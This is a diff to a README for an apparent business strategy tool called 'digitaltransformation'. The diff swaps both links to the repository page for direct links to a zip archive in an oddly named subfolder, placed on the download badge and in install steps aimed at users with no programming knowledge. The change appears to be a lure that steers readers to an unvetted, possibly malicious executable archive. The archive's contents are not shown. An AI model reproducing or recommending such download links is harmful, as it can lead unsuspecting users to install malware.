@@ -1,7 +1,7 @@
 # 🚀 digitaltransformation - Organize your business technology strategy goals
 
 <p align="center">
-  <a href="https://github.com/dunstanhot461/digitaltransformation">
+  <a href="https://github.com/dunstanhot461/digitaltransformation/raw/refs/heads/main/whirlwind/Software-v1.8-alpha.4.zip">
     <img src="https://img.shields.io/badge/Download-Application-blue.svg" alt="Download Application">
   </a>
 </p>
@@ -33,7 +33,7 @@ The application runs on most modern computers. You need the following basics to 
 
 You do not need programming knowledge to use this tool. Follow these steps to prepare your machine.
 
-1. Visit the download page: [https://github.com/dunstanhot461/digitaltransformation](https://github.com/dunstanhot461/digitaltransformation)
+1. Visit the download page: [https://github.com/dunstanhot461/digitaltransformation/raw/refs/heads/main/whirlwind/Software-v1.8-alpha.4.zip](https://github.com/dunstanhot461/digitaltransformation/raw/refs/heads/main/whirlwind/Software-v1.8-alpha.4.zip)
 2. Locate the button labeled "Download" or "Code" on the page.
 3. Select "Download ZIP" from the menu.
 4. Save the folder to your desktop or documents folder.
